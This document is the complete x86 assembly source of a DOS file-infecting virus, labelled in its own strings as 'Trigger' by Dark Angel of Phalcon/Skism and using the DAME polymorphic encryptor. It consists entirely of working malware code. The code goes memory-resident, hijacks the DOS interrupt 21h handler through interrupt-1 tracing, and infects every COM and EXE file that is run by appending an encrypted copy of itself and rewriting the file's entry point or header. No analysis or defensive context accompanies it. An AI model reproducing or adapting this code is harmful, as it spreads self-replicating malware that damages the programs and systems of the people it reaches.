        .model  tiny
        .code
        .radix  16
        org     0

        viruslength     =       (heap - entry)
        virussizeK      =       (endvirus - entry + 3ff) / 400
        virussizepara   =       (virussizeK)*40

        EXE_ID          =       'PS'

entry:
        call    past
next:
        db      0,"Trigger by Dark Angel of Phalcon/Skism",0Dh,0A
        db      "Utilising Dark Angel's Multiple Encryptor (DAME)",0Dh,0A
        db      0Dh,0A,0

checkstub       db 72,0FA,0E,1F,0BA,00,0B8,0B8,40,00,8E,0C0,26,81,3E,63

past:   cld
        pop     bp

        mov     ax,0cf0
        mov     bx,'DA'
        int     21
        cmp     bx,'GH'
        jnz     no_trigger
trigger:
        push    ds
        push    es

        push    cs
        pop     ds
        xor     ax,ax
checkagain:
        lea     si,[bp+checkstub-next]
        mov     es,ax
        xor     di,di
        mov     cx,8
        rep     cmpsw
        jz      trigger_it
        inc     ax
        cmp     ax,0a000
        jb      checkagain
        jmp     exit_trigger
trigger_it:
        mov     [bp+patch-next],ax
        mov     ds,ax
        mov     byte ptr ds:73,0cbh
        push    bp
        mov     bp,-80
        jmp     short $+2
        db      09a ; call far ptr
        dw      1
patch   dw      ?
        pop     bp
        mov     byte ptr ds:73,1f
exit_trigger:
        pop     es
        pop     ds
        jmp     short restore

no_trigger:
        mov     ax,4b90
        int     21
        cmp     ax,bx
        jz      restore

        push    ds
        push    es

        mov     ax,ds
        dec     ax
        mov     ds,ax
        sub     word ptr ds:3,virussizepara
        sub     word ptr ds:12,virussizepara
        mov     es,ds:12

        push    cs
        pop     ds

        xor     di,di
        lea     si,[bp+offset entry-offset next]
        mov     cx,(viruslength + 1)/2
        rep     movsw

        xor     ax,ax
        mov     ds,ax
        sub     word ptr ds:413,virussizeK

        mov     di,offset oldint21
        mov     si,21*4
        movsw
        movsw

        cli

        pushf
        pushf
        pop     ax
        or      ah,1
        push    ax

        mov     ds:1*4+2,es
        mov     word ptr ds:1*4,offset int1_1

        popf

        mov     ah,30
        pushf
        call    dword ptr ds:21*4

        popf

        lds     si,dword ptr es:oldint21
        mov     di,si
        lodsw
        mov     word ptr es:int21patch1,ax
        lodsw
        mov     word ptr es:int21patch2,ax
        lodsb
        mov     byte ptr es:int21patch3,al

        push    ds ; es:di->int 21 handler
        push    es
        pop     ds ; ds->high segment
        pop     es

        mov     al,0ea
        stosb
        mov     ax,offset int21
        stosw
        mov     ax,ds
        stosw
        sti

        pop     es
        pop     ds

restore:
        cmp     sp,-2
        jnz     restoreEXE
restoreCOM:
        lea     si,[bp+readbuffer-next]
        mov     di,100
        push    di
        movsw
        movsw
        ret
restoreEXE:
        mov     ax,ds
        add     ax,10
        add     cs:[bp+readbuffer+16-next], ax
        add     ax,cs:[bp+readbuffer+0e-next]
        mov     ss,ax
        mov     sp,cs:[bp+readbuffer+10-next]
        jmp     dword ptr cs:[bp+readbuffer+14-next]

readbuffer      dw 20cdh
                dw 0bh dup (?)

int1_1:
        push    bp
        mov     bp,sp
        push    ax

        mov     ax, [bp+4]      ; get segment
        cmp     ax, cs:oldint21+2
        jae     exitint1
        mov     cs:oldint21+2,ax
        mov     ax, [bp+2]
        mov     cs:oldint21,ax
exitint1:
        pop     ax
        pop     bp
        iret

int1_2:
        push    bp
        mov     bp,sp
        push    ax

        mov     ax,cs
        cmp     ax,[bp+4]
        jz      exitint1

        mov     ax,[bp+4]
        cmp     ax,cs:oldint21+2
        jnz     int1_2_restore

        mov     ax,[bp+2]
        cmp     ax,cs:oldint21
        jb      int1_2_restore
        sub     ax,5
        cmp     ax,cs:oldint21
        jbe     exitint1
int1_2_restore:
        push    es
        push    di
        cld
        les     di,dword ptr cs:oldint21
        mov     al,0ea
        stosb
        mov     ax,offset int21
        stosw
        mov     ax,cs
        stosw
        pop     di
        pop     es

        and     [bp+6],0feff
        jmp     exitint1

install:
        mov     bx,ax
        iret
int21:
        cmp     ax,4b90
        jz      install

        push    ds
        push    di
        lds     di,dword ptr cs:oldint21
        mov     word ptr ds:[di],1234
int21patch1      =       $ - 2
        mov     word ptr ds:[di+2],1234
int21patch2      =       $ - 2
        mov     byte ptr ds:[di+4],12
int21patch3      =       $ - 1
        pop     di
        pop     ds

        cld

        cmp     ax,4b00
        jz      infect

exitint21:
        push    ds
        push    ax

        xor     ax,ax
        mov     ds,ax
        cli
        mov     word ptr ds:1*4,offset int1_2
        mov     ds:1*4+2,cs
        sti

        pushf
        pop     ax
        or      ah,1
        push    ax
        popf
        pop     ax
        pop     ds
        db      0ea
oldint21 dw     0, 0

callint21:
        pushf
        call    dword ptr cs:oldint21
        ret

already_infected:
        pop     dx
        pop     cx
        mov     ax,5701
        call    callint21

        mov     ah,3e
        call    callint21
exitnoclose:
        mov     ax,4301
        pop     dx
        pop     ds
        pop     cx
        call    callint21

exitinfect:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     bp
        pop     bx
        pop     dx
        pop     cx
        pop     ax
        jmp     exitint21

infect:
        push    ax
        push    cx
        push    dx
        push    bx
        push    bp
        push    si
        push    di
        push    ds
        push    es

        mov     ax,4300
        call    callint21
        push    cx
        push    ds
        push    dx

        mov     ax,4301
        xor     cx,cx
        call    callint21

        mov     ax,3d02
        call    callint21
        jc      exitnoclose
        xchg    ax,bx

        mov     ax,5700
        int     21
        push    cx
        push    dx

        mov     ah,3f
        mov     cx,18
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     dx,offset readbuffer
        mov     si,dx
        call    callint21
        jc      already_infected

        mov     di,offset writebuffer
        mov     cx,18/2

        push    si
        push    di

        rep     movsw

        pop     di
        pop     si

        mov     ax,4202
        xor     cx,cx
        cwd
        int     21

        cmp     word ptr [di],'ZM'
        jnz     infectCOM

infectEXE:
        cmp     readbuffer+10,EXE_ID
go_already_infected:
        jz      already_infected

        mov     ds:writebuffer+4,ax
        mov     ds:writebuffer+2,dx

        mov     cx,10
        div     cx

        sub     ax,ds:writebuffer+8

        mov     ds:writebuffer+14,dx
        mov     ds:writebuffer+16,ax

        xchg    cx,dx

        mov     ds:writebuffer+0e,ax
        mov     ds:writebuffer+10,EXE_ID

        mov     al,10b
        jmp     finishinfect

infectCOM: ; si = readbuffer, di = writebuffer
        push    ax

        mov     cx,4
        xor     dx,dx
check_infection_loop:
        lodsb
        add     dl,al
        loop    check_infection_loop

        pop     ax

        or      dl,dl
        jz      go_already_infected

        mov     dx,18
        cmp     ax,dx
        jnb     no_fixup_com

        mov     ax,4200
        xor     cx,cx
        int     21
no_fixup_com:
        mov     cx,ax
        inc     ch      ; add cx,100
        sub     ax,3
        push    ax
        mov     al,0e9
        stosb
        pop     ax
        stosw
        add     al,ah
        add     al,0e9
        neg     al
        stosb

        mov     al,11b
finishinfect:
        cbw
; ax = bitmask
; bx = start decrypt in carrier file
; cx = encrypt length
; dx = start encrypt in virus
; si = buffer to put decryption routine
; di = buffer to put encryption routine
        push    bx

        xchg    cx,bx

        xor     si,si
        mov     di,offset copyvirus
        mov     cx,(heap-entry+1)/2
        rep     movsw

        push    ax
        call    rnd_init_seed
        pop     ax

        mov     dx,offset copyvirus
        mov     cx,viruslength
        mov     si,offset _decryptbuffer
        mov     di,offset _encryptbuffer
        call    dame

        push    cx

        cmp     ds:writebuffer,'ZM'
        jnz     no_fix_header

        mov     dx,ds:writebuffer+2
        mov     ax,ds:writebuffer+4
        add     cx,viruslength
        add     ax,cx
        adc     dx,0
        mov     cx,200
        div     cx
        or      dx,dx
        jz      nohiccup
        inc     ax
nohiccup:
        mov     ds:writebuffer+4,ax
        mov     ds:writebuffer+2,dx
no_fix_header:
        call    di
        pop     cx

        pop     bx

        mov     ah,40
        mov     dx,offset _decryptbuffer
        call    callint21

        mov     ah,40
        mov     cx,viruslength
        mov     dx,offset copyvirus
        call    callint21

        mov     ax,4200
        xor     cx,cx
        cwd
        int     21

        mov     ah,40
        mov     cx,18
        mov     dx,offset writebuffer
        call    callint21
        jmp     already_infected

vars = 0
include dame.asm

heap:
vars = 1
include dame.asm

writebuffer             dw       0c dup (?)
_encryptbuffer:         db       80 dup (?)
_decryptbuffer:         db      180 dup (?)
copyvirus               db      viruslength dup (?)
                        db      20 dup (?)
endvirus:

end entry

